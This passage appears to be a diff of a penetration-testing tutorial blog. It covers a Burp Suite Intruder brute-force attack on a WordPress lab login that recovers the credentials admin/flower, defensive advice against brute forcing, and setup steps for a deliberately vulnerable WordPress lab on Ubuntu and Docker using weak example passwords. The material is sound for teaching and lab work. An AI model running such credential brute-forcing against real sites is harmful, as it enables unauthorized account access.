+<h3>In&nbsp;<strong>payloads tab, click</strong>&nbsp;on&nbsp;<strong>payload set&nbsp;</strong>drop-down, here you can see numbers 1 and 2. Select&nbsp;<strong>number 1&nbsp;</strong>for the first payload position. Choose a&nbsp;<strong>simple list</strong>&nbsp;from<strong>&nbsp;payload type,&nbsp;</strong>this list lets you configure a simple list of strings that are used as payloads. you can manually add items to the list using the text box and the&nbsp;<strong>Add</strong>&nbsp;button, or you can paste a list from the clipboard, or&nbsp;<strong>load</strong>&nbsp;from file.</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-nNHV7Z5Mi58/XkGQiH-fRkI/AAAAAAAAipE/Q2Kv9Bm1AdMuZOgvtzvyc3YcgpkAW6kfgCLcBGAsYHQ/s1600/8.png" alt="" data-proportion="true" data-align="none" data-index="27" data-file-name="8.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-nNHV7Z5Mi58/XkGQiH-fRkI/AAAAAAAAipE/Q2Kv9Bm1AdMuZOgvtzvyc3YcgpkAW6kfgCLcBGAsYHQ/s1600/8.png" alt="" data-proportion="true" data-align="none" data-index="27" data-file-name="8.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>Similarly&nbsp;<strong>select number 2</strong>&nbsp;for another payload position and select&nbsp;<strong>runtime file</strong>&nbsp;from payload type, this is useful when a very large list of payloads is needed, to avoid holding the entire list in memory. Add the path of any dictionary file having password only. Click on&nbsp;<strong>start attack.</strong></p>
-
+<h3>&nbsp;</h3>
+<h3>Similarly&nbsp;<strong>select number 2</strong>&nbsp;for another payload position and select&nbsp;<strong>runtime file</strong>&nbsp;from payload type, this is useful when a very large list of payloads is needed, to avoid holding the entire list in memory. Add the path of any dictionary file having password only. Click on&nbsp;<strong>start attack.</strong></h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-iioQw8sv3tU/XkGQiCP3N0I/AAAAAAAAipA/sAKy7iJFKXUONlPPgmMyPNTS5PeBWbpEgCLcBGAsYHQ/s1600/9.png" alt="" data-proportion="true" data-align="none" data-index="28" data-file-name="9.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-iioQw8sv3tU/XkGQiCP3N0I/AAAAAAAAipA/sAKy7iJFKXUONlPPgmMyPNTS5PeBWbpEgCLcBGAsYHQ/s1600/9.png" alt="" data-proportion="true" data-align="none" data-index="28" data-file-name="9.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p>It will match the combination of both payloads and would try to login in with username and password as you can see below. By paying attention to the&nbsp;<strong>status</strong>&nbsp;and&nbsp;<strong>length</strong>&nbsp;of the payloads you can see login credentials&nbsp;<strong>admin</strong>&nbsp;and&nbsp;<strong>flower</strong>&nbsp;are having status as 302 and length as 1203 which is different than all other combinations indicating these are the results we are looking for. Hence&nbsp;<strong>username</strong><strong>&nbsp;</strong>and<strong>&nbsp;password</strong>&nbsp;are&nbsp;<strong>admin</strong>&nbsp;and&nbsp;<strong>flower</strong>&nbsp;respectively</p>
-
+<h3>&nbsp;</h3>
+<h3>It will match the combination of both payloads and would try to login in with username and password as you can see below. By paying attention to the&nbsp;<strong>status</strong>&nbsp;and&nbsp;<strong>length</strong>&nbsp;of the payloads you can see login credentials&nbsp;<strong>admin</strong>&nbsp;and&nbsp;<strong>flower</strong>&nbsp;are having status as 302 and length as 1203 which is different than all other combinations indicating these are the results we are looking for. Hence&nbsp;<strong>username</strong><strong>&nbsp;</strong>and<strong>&nbsp;password</strong>&nbsp;are&nbsp;<strong>admin</strong>&nbsp;and&nbsp;<strong>flower</strong>&nbsp;respectively</h3>
 <div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-nDSelmUA6ek/XkGQfmlqrRI/AAAAAAAAioo/_AzqJfhsvhwLZgCMHTwh2PRyrXUzJCIlACLcBGAsYHQ/s1600/11.png" alt="" data-proportion="true" data-align="none" data-index="29" data-file-name="11.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-nDSelmUA6ek/XkGQfmlqrRI/AAAAAAAAioo/_AzqJfhsvhwLZgCMHTwh2PRyrXUzJCIlACLcBGAsYHQ/s1600/11.png" alt="" data-proportion="true" data-align="none" data-index="29" data-file-name="11.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-
-<p><br>
-</p>
-
-<p><strong>How to avoid a Brute Force attack?</strong></p>
-
-<p>One can certainly avoid these attacks using some precautionary measures as following:</p>
-
-<p><strong>Password Length:</strong>&nbsp;An ideal length should be 8-16 characters long for passwords. It’s important to avoid the most common passwords and to change them frequently&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
-
-<p><strong>Password Complexity:</strong>&nbsp;A password should consist of UPPERCASE and lowercase alphabets and should also include</p>
-
-<p>numbers and special characters. Users should choose complex passphrases rather than single words; the complexity of the password delays the cracking process.</p>
-
-<p><strong>Limit Login Attempts:&nbsp;</strong>Limit the login attempts on your WordPress admin. For example, after three failed login attempts; it should block that particular IP for a certain period of time to stop it for making further login attempts.</p>
-
-<p><strong>Two Factor Authentication:&nbsp;</strong>The next way to be secure from brute-forcing is two-factor authentication or 2FA. This is a process that gives web services secondary access to the account owner in order to verify a login attempt. Generally, this involves a phone number and/or an email address.</p>
-
-<p><strong>Using Captcha</strong><strong>:&nbsp;</strong>Installing captcha in your WordPress site is fairly easy and they help to prevent bots from executing automated scripts to login into your account.</p>
-
-<p><strong>Install a WordPress Firewall Plugin:</strong>&nbsp;Even the unsuccessful brute force attacks can slow down your website or completely crash the server. This is why it’s important to block them and to do that, you’ll need a website firewall solution. A firewall filters out bad traffic and blocks it from accessing your site.</p>
-
-<h4><strong>Cloudflare:&nbsp;</strong>It is a renowned service to provide a protective shield against brute force attacks</h4>
-
-<p><strong>Install and Setup a WordPress Backup Plugin:&nbsp;</strong>If everything fails, one must have a backup plan!</p>
-
-<p>There are several great&nbsp;WordPress backup plugins, which allow you to schedule automatic backups.</p>
-
-<h4><strong>Disabling Directory Browsing and Installing WordPress Updates&nbsp;</strong>regularly can also help to be safe from brute-forcing attacks against a WordPress website.</h4>
-
-<h1>Penetration Testing Lab Setup: WordPress</h1>
-
-<p>In this guide, we will demonstrate how to set-up our own Vulnerable WordPress CMS for penetration testing on Ubuntu 20.04, Docker and Windows using XAMPP server. &nbsp;</p>
-
+<h3>&nbsp;</h3>
+<h3><strong>How to avoid a Brute Force attack?</strong></h3>
+<h3>One can certainly avoid these attacks using some precautionary measures as following:</h3>
+<h3><strong>Password Length:</strong>&nbsp;An ideal length should be 8-16 characters long for passwords. It&rsquo;s important to avoid the most common passwords and to change them frequently&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</h3>
+<h3><strong>Password Complexity:</strong>&nbsp;A password should consist of UPPERCASE and lowercase alphabets and should also include</h3>
+<h3>numbers and special characters. Users should choose complex passphrases rather than single words; the complexity of the password delays the cracking process.</h3>
+<h3><strong>Limit Login Attempts:&nbsp;</strong>Limit the login attempts on your WordPress admin. For example, after three failed login attempts; it should block that particular IP for a certain period of time to stop it for making further login attempts.</h3>
+<h3><strong>Two Factor Authentication:&nbsp;</strong>The next way to be secure from brute-forcing is two-factor authentication or 2FA. This is a process that gives web services secondary access to the account owner in order to verify a login attempt. Generally, this involves a phone number and/or an email address.</h3>
+<h3><strong>Using Captcha</strong><strong>:&nbsp;</strong>Installing captcha in your WordPress site is fairly easy and they help to prevent bots from executing automated scripts to login into your account.</h3>
+<h3><strong>Install a WordPress Firewall Plugin:</strong>&nbsp;Even the unsuccessful brute force attacks can slow down your website or completely crash the server. This is why it&rsquo;s important to block them and to do that, you&rsquo;ll need a website firewall solution. A firewall filters out bad traffic and blocks it from accessing your site.</h3>
+<h3><strong>Cloudflare:&nbsp;</strong>It is a renowned service to provide a protective shield against brute force attacks</h3>
+<h3><strong>Install and Setup a WordPress Backup Plugin:&nbsp;</strong>If everything fails, one must have a backup plan!</h3>
+<h3>There are several great&nbsp;WordPress backup plugins, which allow you to schedule automatic backups.</h3>
+<h3><strong>Disabling Directory Browsing and Installing WordPress Updates&nbsp;</strong>regularly can also help to be safe from brute-forcing attacks against a WordPress website.</h3>
+<h3>Penetration Testing Lab Setup: WordPress</h3>
+<h3>In this guide, we will demonstrate how to set-up our own Vulnerable WordPress CMS for penetration testing on Ubuntu 20.04, Docker and Windows using XAMPP server. &nbsp;</h3>
 <h3><strong>Contents</strong></h3>
-
 <ul>
-  <li>WordPress Setup on Ubuntu 20.04</li>
-  <li>Install WordPress using Docker</li>
-  <li>Install WordPress on Windows Platform</li>
-</ul>
-
-<h3><strong>WordPress Setup on Ubuntu 20.04</strong></h3>
-
-<p>In order to configure WordPress in your Ubuntu platform, there are some prerequisites required for CMS&nbsp; installation.</p>
-
-<p><strong>Prerequisites for WordPress</strong></p>
-
-<ul>
-  <li>Apache</li>
-  <li>Database (MySQL/Mariadb)</li>
-  <li>PHP</li>
-</ul>
-
-<p><strong>Install Apache</strong></p>
-
-<p>Let’s start the HTTP service with the help of Apache using privilege account (as root), execute the following command in the terminal.</p>
-
-<pre>
-apt install apache2</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-QD76y5p6HoM/XwoJx4JdzJI/AAAAAAAAlpo/dkENPincOo4Mg3lSUHD-IRECgMMfxOkAwCLcBGAsYHQ/s1600/1.png" alt="" data-proportion="true" data-align="none" data-index="30" data-file-name="1.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p><strong>Install MySQL</strong></p>
-
-<p>For run WordPress, you will also need a database server. The database server is where WordPress content is saved. So, we are going to choose MariaDB-server as the required database for WordPress and execute the following command</p>
-
-<pre>
-apt install mariadb-server mariadb-client</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-4psv0iqhc_4/XwoJ2L9pT6I/AAAAAAAAlps/NSNb43WGp585tddWsbnZca0vZKd6KmPngCLcBGAsYHQ/s1600/2.png" alt="" data-proportion="true" data-align="none" data-index="31" data-file-name="2.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p>Next, execute the following commands to protect remote root login&nbsp;for the database server.</p>
-
-<pre>
-mysql_secure_installation</pre>
-Then respond to questions asked after the command has been executed.<br>
-
-<ul>
-  <li>Enter current password for root (enter for none):&nbsp;<strong>press the Enter</strong></li>
-  <li>Set root password? [Y/n]:&nbsp;<strong>Y</strong></li>
-  <li>New password:&nbsp;<strong>Enter password</strong></li>
-  <li>Re-enter new password:&nbsp;<strong>Repeat password</strong></li>
-  <li>Remove anonymous users? [Y/n]:&nbsp;<strong>Y</strong></li>
-  <li>Disallow root login remotely? [Y/n]:&nbsp;<strong>Y</strong></li>
-  <li>Remove test database and access to it? [Y/n]:&nbsp;<strong>Y</strong></li>
-  <li>Reload privilege tables now? [Y/n]:&nbsp;<strong>Y</strong></li>
-</ul>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-xWteHpMYj1M/XwoKAXHaOKI/AAAAAAAAlpw/LtgzxFZ6RdAG2kfXJGFn3LsM5PhNmyMUACLcBGAsYHQ/s1600/3.png" alt="" data-proportion="true" data-align="none" data-index="32" data-file-name="3.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p><strong>Install php</strong></p>
-
-<p>And at last, install the php php-MySQL and run the following command to install this application.</p>
-
-<pre>
-apt install php php-mysql</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-K6HkQRox_R8/XwoKIbQKfKI/AAAAAAAAlp8/YdUyE_KY7hw6LLlS0t9VWzkfju0YPKVXQCLcBGAsYHQ/s1600/4.png" alt="" data-proportion="true" data-align="none" data-index="33" data-file-name="4.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p><strong>Create a Database for WordPress</strong></p>
-
-<p>To access the MySQL, enter the following command which will create a database for wordpress.</p>
-
-<pre>
-mysql -u root -p<br>
-CREATE DATABASE wordpress;<br>
-CREATE USER &apos;wp_user&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password&apos;;<br>
-GRANT ALL ON wordpress.* TO &apos;wp_user&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password&apos;;<br>
-FLUSH PRIVILEGES;<br>
-exit</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-LTeAsFaNUKI/XwoKSDwLPvI/AAAAAAAAlqE/PnU2lHvLTTMOc3YodpATQ0EXlK3vhh5_wCLcBGAsYHQ/s1600/5.png" alt="" data-proportion="true" data-align="none" data-index="34" data-file-name="5.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p><strong>WordPress Installation &amp; Configuration</strong></p>
-
-<p>Now, its time to download and install the WordPress on our localhost, with the help of wget command we have fetched the compressed file of wordpress setup and extract the folder inside the /var/www/html directory.</p>
-
-<pre>
-cd /var/www/html<br>
-wget http://www.wordpress.org/latest.tar.gz<br>
-tar –xvf latest.tar.gz</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-_qeCCuKUyQE/XwoKcMQrP1I/AAAAAAAAlqM/PkNf8osoyigGQ7phZMkYwpgYVeeOgGvaQCLcBGAsYHQ/s1600/6.png" alt="" data-proportion="true" data-align="none" data-index="35" data-file-name="6.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p>Then run the given command to change ownership of ‘wordpress’ directory as well permission for upload directory.</p>
-
-<pre>
-chown -R www-data:www-data wordpress/<br>
-chmod -R 755&nbsp; wordpress/<br>
-mkdir wordpress/wp-content/uploads<br>
-chown -R&nbsp; www-data:www-data wordpress/wp-content/uploads</pre>
-<strong>
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-    <figure style="margin: 0px;">
-      <img src="https://1.bp.blogspot.com/-wU3V5X1YKEQ/XwoKjKbg6cI/AAAAAAAAlqU/8PLtp7CXB94JRbwvvtwMu5vIlP1ZsMKdgCLcBGAsYHQ/s1600/7.png" alt="" data-proportion="true" data-align="none" data-index="36" data-file-name="7.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-    </figure>
-</div>
-</strong><br>
-
-<p>Now, till here we are done with the installation, to create a WordPress website we need to access the application over web browser on localhost by executing following and then complete the remaining installation process.</p>
-
-<pre>
-http://localhost/wordpress/</pre>
-This will open the setup file and ask to choose your preferred language. I select&nbsp;<strong>English</strong>&nbsp;and then press the&nbsp;<strong>continue&nbsp;</strong>Tab.<br>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-vBLntI2O0lQ/XwoKsDqkfSI/AAAAAAAAlqc/fhEBknFNwkAOV3NkvxudQDSIafAOrFdoACLcBGAsYHQ/s1600/8.png" alt="" data-proportion="true" data-align="none" data-index="37" data-file-name="8.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>Read the given content and press Let’s go to continue the activity.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-9-6OHy7vnM8/XwoKzLQiPtI/AAAAAAAAlqk/T-x5mCR7LKE7k2TnDOvtP0SSwhByA5uQgCLcBGAsYHQ/s1600/9.png" alt="" data-proportion="true" data-align="none" data-index="38" data-file-name="9.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>To continue the activity, we need to enter the required details that will help the application to connect with database, thus it should be the same information that we have entered above at the time of database we have created for WordPress.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-gylfROhBBd0/XwoK5yElFlI/AAAAAAAAlqo/5WM0xDfAdmYqqttDyt4lmCdXRJBryEpuQCLcBGAsYHQ/s1600/10.png" alt="" data-proportion="true" data-align="none" data-index="39" data-file-name="10.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>And if your above-given detail is correct, you will get the Installation page as we have here.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-BIoFBnCO9Co/XwoLCs-eveI/AAAAAAAAlqw/1v-1yx1ARZgzrUqjXFObHcUTW1ASSnqQgCLcBGAsYHQ/s1600/11.png" alt="" data-proportion="true" data-align="none" data-index="40" data-file-name="11.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>Now after that, it will ask you enter details for your Website which you want to host using WordPress CMS as shown in the below image and then finally click on install Tab.</p>
-
-<p><strong>Note</strong>: The User and Password asked before the installation is referred to your Database information, and the username and password asked after installed are referred to your application (CMS).</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-LjY6s1HwOtA/XwoLPPBjOgI/AAAAAAAAlq4/Jk_Kdses-5Ao5F8cY8WVWj9b1rgeHP9BACLcBGAsYHQ/s1600/12.png" alt="" data-proportion="true" data-align="none" data-index="41" data-file-name="12.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>And once it is done, you will get application login page where you have to enter credential to access the dashboard of your CMS.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-6hMjkcDRaGs/XwoLWp-8AGI/AAAAAAAAlrA/8HPZXQd8nB8yNfyJSkvAB8VgNgVs1FOCgCLcBGAsYHQ/s1600/13.png" alt="" data-proportion="true" data-align="none" data-index="42" data-file-name="13.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>You will get the dashboard where you can write your content that to be posted on the website.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-QIsbpYfkjPE/XwoLlQ5keNI/AAAAAAAAlrI/kDmJd3vhNXUqLV9wYf8bBYgqtdT9WZohQCLcBGAsYHQ/s1600/14.png" alt="" data-proportion="true" data-align="none" data-index="43" data-file-name="14.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
-<p>Open the wp-config.php file in wordpress directory and paste the following lines in it to access the website page.</p>
-
-<pre>
-define( &apos;WP_SITEURL&apos;, &apos;http://&apos; .$_SERVER[&apos;HTTP_HOST&apos;].&apos;/wordpress&apos;);<br>
-define( &apos;WP_HOME&apos;, &apos;http://&apos; .$_SERVER[&apos;HTTP_HOST&apos;].&apos;/wordpress&apos;);</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-V0pG032HJ8I/XwoLtYAoBsI/AAAAAAAAlrQ/vsdaMETR6YIn4SjzGKDUyWbEO8gauC0MACLcBGAsYHQ/s1600/16.png" alt="" data-proportion="true" data-align="none" data-index="44" data-file-name="16.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p>And Finally, it is over here, and your WordPress is completely ready to go😊.</p>
-
-<div class="se-component se-image-container __se__float- __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-PzSRtdHUUWE/XwoL3A0vjOI/AAAAAAAAlrY/bp5wxWGx3_Mmm8zG4OyidTqKmkRMN5mGACLcBGAsYHQ/s1600/17.png" alt="" data-proportion="true" data-align="none" data-index="45" data-file-name="17.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-
-<p><br>
-</p>
-
+<li>
+<h3>WordPress Setup on Ubuntu 20.04</h3>
+</li>
+<li>
 <h3>Install WordPress using Docker</h3>
-
-<p>Install WordPress through docker will release your effort of installing prerequisites for WordPress setup. It is a very easy and quick technique to configured WordPress. All you need to have some basic knowledge of Docker and its functionalities.</p>
-
-<p>To install wordpress using docker, first, we will update the Ubuntu repository and then install the latest version of docker.io. Let’s start the installation of docker packages with the apt command as below:</p>
-
-<pre>
-apt install docker.io</pre>
-
+</li>
+<li>
+<h3>Install WordPress on Windows Platform</h3>
+</li>
+</ul>
+<h3><strong>WordPress Setup on Ubuntu 20.04</strong></h3>
+<h3>In order to configure WordPress in your Ubuntu platform, there are some prerequisites required for CMS&nbsp; installation.</h3>
+<h3><strong>Prerequisites for WordPress</strong></h3>
+<ul>
+<li>
+<h3>Apache</h3>
+</li>
+<li>
+<h3>Database (MySQL/Mariadb)</h3>
+</li>
+<li>
+<h3>PHP</h3>
+</li>
+</ul>
+<h3><strong>Install Apache</strong></h3>
+<h3>Let&rsquo;s start the HTTP service with the help of Apache using privilege account (as root), execute the following command in the terminal.</h3>
+<h3>apt install apache2</h3>
 <div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-3VOY8uQJaGo/XwoL-Of1WJI/AAAAAAAAlrg/X8hGjIz8v6kKOl3v00aznptHAjvSeLx7gCLcBGAsYHQ/s1600/18.png" alt="" data-proportion="true" data-align="none" data-index="46" data-file-name="18.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-QD76y5p6HoM/XwoJx4JdzJI/AAAAAAAAlpo/dkENPincOo4Mg3lSUHD-IRECgMMfxOkAwCLcBGAsYHQ/s1600/1.png" alt="" data-proportion="true" data-align="none" data-index="30" data-file-name="1.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-<br>
-
-<p>Docker Compose is used to run multiple containers as a single service. Let’s begin the installation of docker-compose with the help of apt by entering the following command.</p>
-
-<pre>
-apt install docker-compose</pre>
-
+<h3>&nbsp;</h3>
+<h3><strong>Install MySQL</strong></h3>
+<h3>For run WordPress, you will also need a database server. The database server is where WordPress content is saved. So, we are going to choose MariaDB-server as the required database for WordPress and execute the following command</h3>
+<h3>apt install mariadb-server mariadb-client</h3>
 <div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-TAHd1yxg2OU/XwoMGLpfBpI/AAAAAAAAlrk/YUtGWp6ku8MFcUpfpLmNIKIKOnl91iW-QCLcBGAsYHQ/s1600/19.png" alt="" data-proportion="true" data-align="none" data-index="47" data-file-name="19.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
+<figure style="margin: 0px;"><img src="https://1.bp.blogspot.com/-4psv0iqhc_4/XwoJ2L9pT6I/AAAAAAAAlps/NSNb43WGp585tddWsbnZca0vZKd6KmPngCLcBGAsYHQ/s1600/2.png" alt="" data-proportion="true" data-align="none" data-index="31" data-file-name="2.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" data-percentage="auto,auto" /></figure>
 </div>
-<br>
-
-<p>After installing the composer for the Docker, we must create a directory by the name of WordPress.&nbsp;After creating the directory, we will create a .yml file that will contain the service definitions for your setup.</p>
-
-<pre>
-mkdir wordpress<br>
-cd wordpress/<br>
-nano docker-compose.yml</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-ct7BZnAfd44/XwoMN0T-dpI/AAAAAAAAlrw/_3wQ87O5rj8YpOFm1P6-QFLSKJRqdvPkACLcBGAsYHQ/s1600/20.png" alt="" data-proportion="true" data-align="none" data-index="48" data-file-name="20.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p>Now Paste the following text in the .yml and save the configuration. Source Code From&nbsp;<strong>here</strong>&nbsp;-&nbsp;https://docs.docker.com/compose/wordpress/</p>
-
-<pre>
-version: &apos;3.3&apos;<br>
-<br>
-services:<br>
-   db:<br>
-     image: mysql:5.7<br>
-     volumes:<br>
-       - db_data:/var/lib/mysql<br>
-     restart: always<br>
-     environment:<br>
-       MYSQL_ROOT_PASSWORD: somewordpress<br>
-       MYSQL_DATABASE: wordpress<br>
-       MYSQL_USER: wordpress<br>
-       MYSQL_PASSWORD: wordpress<br>
-<br>
-   wordpress:<br>
-     depends_on:<br>
-       - db<br>
-     image: wordpress:latest<br>
-     ports:<br>
-       - &quot;8000:80&quot;<br>
-     restart: always<br>
-     environment:<br>
-       WORDPRESS_DB_HOST: db:3306<br>
-       WORDPRESS_DB_USER: wordpress<br>
-       WORDPRESS_DB_PASSWORD: wordpress<br>
-       WORDPRESS_DB_NAME: wordpress<br>
-volumes:<br>
-    db_data: {}</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-d8ztuPUt5N8/XwoMZ9c5okI/AAAAAAAAlr4/xG2FcL7ZP0gr4N-BWFQSowqhl7f6Z75XgCLcBGAsYHQ/s1600/21.png" alt="" data-proportion="true" data-align="none" data-index="49" data-file-name="21.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p>Now run the docker image in detach mode using the following command</p>
-
-<pre>
-docker–compose up -d</pre>
-
-<div class="se-component se-image-container __se__float-none" contenteditable="false">
-  <figure style="margin: 0px;">
-    <img src="https://1.bp.blogspot.com/-FISJDxSierg/XwoMhXPsa6I/AAAAAAAAlsA/oga-oVoPxrUXWB_t9KYRK0xUmqPn7UBeQCLcBGAsYHQ/s1600/22.png" alt="" data-proportion="true" data-align="none" data-index="50" data-file-name="22.png" data-file-size="0" data-origin="," data-size="," data-rotate="" data-rotatex="" data-rotatey="" style="" data-percentage="auto,auto">
-  </figure>
-</div>
-<br>
-
-<p>After doing all the configuration step-by-step, now access the localhost on port 8000 that will be hosting your WordPress Docker image and configure your WordPress site as done in the previous section.</p>
-
+<h3>&nbsp;</h3>
+<h3>Next, execute the following commands to protect remote root login&nbsp;for the database server.</h3>
+<h3>mysql_secure_installation</h3>
+<h3>Then respond to questions asked after the command has been executed.</h3>
+<ul>
+<li>
+<h3>Enter current password for root (enter for none):&nbsp;<strong>press the Enter</strong></h3>
+</li>
+<li>
+<h3>Set root password? [Y/n]:&nbsp;<strong>Y</strong></h3>
+</li>
+<li>
